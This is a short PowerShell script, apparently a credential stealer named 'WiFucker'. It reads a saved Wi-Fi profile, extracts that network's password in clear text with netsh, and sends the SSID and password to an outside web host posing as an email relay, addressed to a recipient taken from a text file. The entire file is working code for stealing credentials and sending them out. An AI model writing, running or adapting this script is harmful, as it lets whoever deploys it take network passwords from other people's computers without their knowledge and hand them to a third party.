
# Set-ExecutionPolicy Unrestricted

# getting SSID 
function Get_SSID{
$profiles = (netsh wlan show profile | find "All User Profile").Split(":") ;
$SSID = $profiles[1].Split(" ")[1] ;
return $SSID
}

# printing password 
function Get_Pass ($SSID){
$Key_Content = (netsh wlan show profile name=$SSID  key=clear | find "Key Content")
$password = $Key_Content.Split(":")[1]
# echo "SSID     :$SSID"
# echo "Password :$password"
return "SSID: $SSID  Password:$password"
}

function Send_Pass($data){
    $from = "WiFucker@WiFucker.com"
    $to = Get-Content "ToEmail.txt"
    $subject = "WiFucker"
    $message = $data
    Invoke-WebRequest -Uri "https://email-pranks.000webhostapp.com/gmail.php?from=$from&to=$to&subject=$subject&message=$message"
}

$SSID = Get_SSID
$PWD = Get_Pass($SSID)
echo $PWD
Send_Pass($PWD)